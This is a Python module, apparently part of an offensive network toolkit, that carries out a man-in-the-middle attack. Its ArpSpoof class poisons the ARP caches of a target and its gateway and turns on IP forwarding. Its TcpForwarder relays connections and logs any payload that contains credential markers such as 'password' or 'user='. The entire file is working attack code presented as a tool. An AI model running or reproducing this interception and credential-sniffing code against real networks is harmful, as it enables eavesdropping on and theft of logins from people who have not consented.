"""Man-in-the-Middle module: ARP spoofing + TCP forwarding + sniffing.

Core idea: put yourself on the wire between a target and its gateway by
poisoning ARP, then transparently forward TCP connections while logging the
payloads. Everything that needs a raw socket (ARP) is done inside scapy and
degrades cleanly without root; the TCP forwarder is pure Python.
"""

import asyncio
import sys
import time
from dataclasses import dataclass, field

from backrooms.core.exceptions import NetworkError

#: Substrings that mark a payload as credential-like.
CREDENTIAL_MARKERS = ("password", "passwd", "login", "username", "user=", "pass=")
REDACT = "████"


@dataclass
class MitmOptions:
    """Knobs for the MITM session."""

    reverse: bool = True
    verbosity: int = 1
    timeout: float = 2.0


@dataclass
class CredentialHit:
    """A credential-looking payload seen in a forwarded stream."""

    source: str
    direction: str
    payload: str
    marker: str

    @property
    def redacted(self) -> str:
        return REDACT


@dataclass
class MitmResult:
    """Aggregate of a MITM run."""

    forwarded: list[tuple[str, str, int]] = field(default_factory=list)
    credentials: list[CredentialHit] = field(default_factory=list)


def classify(payload: str) -> str | None:
    """Return the first credential marker found in payload (case-insensitive)."""
    low = payload.lower()
    for marker in CREDENTIAL_MARKERS:
        if marker in low:
            return marker
    return None


class ArpSpoof:
    """Poison the target<->gateway ARP cache to route traffic through us.

    Requires raw sockets (root). On Linux it enables IP forwarding so the
    OS relays traffic between the two ends. On stop, it restores the pair's
    ARP cache using the real MACs captured at start.
    """

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: str | None = None,
        options: MitmOptions | None = None,
    ) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.options = options or MitmOptions()
        self._real_target_mac: str | None = None
        self._real_gateway_mac: str | None = None
        self._running = False

    def _send(self, target: str, spoofed_for: str, spoof_mac: str) -> None:
        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]

        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            hwsrc=spoof_mac,
            psrc=spoofed_for,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=target,
        )
        srp(pkt, iface=self.interface, timeout=self.request_timeout, verbose=False)

    def _resolve_mac(self, ip: str) -> str | None:
        """Ask the network for the real MAC of `ip` (ARP request)."""
        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]

        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=self.interface,
                timeout=self.request_timeout,
                verbose=False,
            )
        except OSError:
            return None
        if ans:
            return ans[0][1].hwsrc
        return None

    @property
    def request_timeout(self) -> float:
        return self.options.timeout

    def start(self) -> None:
        """Begin poisoning; call stop() in a finally block."""
        if not _have_root():
            raise NetworkError("ARP spoofing requires root (try: sudo backrooms mitm arp ...)")
        # Resolve real MACs first so we can genuinely restore later.
        self._real_target_mac = self._resolve_mac(self.target_ip)
        self._real_gateway_mac = self._resolve_mac(self.gateway_ip)
        self._enable_ip_forward()
        self._running = True

    def poison_loop(self) -> None:
        """Send periodic poisoned ARP replies in a blocking loop."""
        self.start()
        try:
            while self._running:
                self._poison_once()
                try:
                    time.sleep(2)
                except KeyboardInterrupt:
                    break
        finally:
            self.stop()

    def _poison_once(self) -> None:
        # Our MAC is what the *other* end sees; scapy will fill hwsrc with
        # our interface MAC when not given — but we pass it explicitly to be
        # consistent. We impersonate the gateway to the target and the target
        # to the gateway.
        our_mac = self._own_mac()
        if our_mac is None:
            return
        self._send(self.target_ip, self.gateway_ip, our_mac)  # target -> us as gateway
        self._send(self.gateway_ip, self.target_ip, our_mac)  # gateway -> us as target

    def _own_mac(self) -> str | None:
        """Return the hardware address of our interface, best effort."""
        if self.interface:
            try:
                from scapy.all import get_if_hwaddr  # type: ignore[attr-defined]

                return get_if_hwaddr(self.interface)
            except (OSError, RuntimeError, ImportError):
                pass
        import uuid

        node = uuid.getnode()
        if node is None or node == 0xFFFFFFFFFFFF:
            return None
        return ":".join(f"{(node >> (40 - 8 * i)) & 0xFF:02x}" for i in range(6))

    def stop(self) -> None:
        """Restore the ARP cache of both ends using their real MACs."""
        self._running = False
        if self._real_target_mac and self._real_gateway_mac:
            try:
                # Tell target that gateway's real MAC is gateway_mac, and
                # tell gateway that target's real MAC is target_mac.
                self._restore_arp(self.target_ip, self.gateway_ip, self._real_gateway_mac)
                self._restore_arp(self.gateway_ip, self.target_ip, self._real_target_mac)
            except Exception:  # noqa: BLE001, S110 - best-effort restore
                pass

    def _restore_arp(self, target: str, psrc: str, real_mac: str) -> None:
        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]

        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            hwsrc=real_mac,
            psrc=psrc,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=target,
        )
        srp(pkt, iface=self.interface, timeout=self.request_timeout, verbose=False)

    @staticmethod
    def _enable_ip_forward() -> None:
        if sys.platform.startswith("linux"):
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as fh:
                    fh.write("1")
            except OSError:
                pass  # forwarding stays off; forwarding still works session-wide


class TcpForwarder:
    """Forward bytes between a client and a target server, capturing payloads."""

    def __init__(self, options: MitmOptions | None = None) -> None:
        self.options = options or MitmOptions()
        self._hits: list[CredentialHit] = []
        self._active = 0

    @property
    def hits(self) -> list[CredentialHit]:
        return self._hits

    async def run(
        self, local_host: str, local_port: int, target_host: str, target_port: int
    ) -> int:
        """Accept connections on local and forward each to target. Returns connection count."""
        server = await asyncio.start_server(
            lambda reader, writer: self._handle(reader, writer, target_host, target_port),
            local_host,
            local_port,
            reuse_address=True,
        )
        async with server:
            try:
                await server.serve_forever()  # runs until the task is cancelled
            except asyncio.CancelledError:
                server.close()
                await server.wait_closed()
                return self._active
        return self._active

    async def _handle(
        self,
        client_reader: asyncio.StreamReader,
        client_writer: asyncio.StreamWriter,
        target_host: str,
        target_port: int,
    ) -> None:
        try:
            target_reader, target_writer = await asyncio.open_connection(target_host, target_port)
        except OSError:
            client_writer.close()
            return
        self._active += 1
        peer = client_writer.get_extra_info("peername") or ("?", 0)
        src = f"{peer[0]}:{peer[1]}"

        async def pump(
            reader: asyncio.StreamReader,
            writer: asyncio.StreamWriter,
            direction: str,
        ) -> None:
            try:
                while (chunk := await reader.read(4096)):
                    writer.write(chunk)
                    await writer.drain()
                    self._capture(src, direction, chunk)
            except (asyncio.CancelledError, OSError, ConnectionError):
                pass
            finally:
                writer.close()
                try:
                    await writer.wait_closed()
                except (OSError, RuntimeError):
                    pass

        client_to_server = asyncio.create_task(pump(client_reader, target_writer, "c->s"))
        server_to_client = asyncio.create_task(pump(target_reader, client_writer, "s->c"))
        await asyncio.gather(client_to_server, server_to_client, return_exceptions=True)
        self._active -= 1
        client_writer.close()

    def _capture(self, source: str, direction: str, chunk: bytes) -> None:
        text = chunk.decode("utf-8", errors="replace")
        marker = classify(text)
        if marker is not None:
            self._hits.append(CredentialHit(source, direction, text.strip()[:200], marker))

    @property
    def active_connections(self) -> int:
        return self._active


def _have_root() -> bool:
    try:
        return bool(getattr(sys, "geteuid", lambda: 0)() == 0)
    except (AttributeError, OSError):
        return False
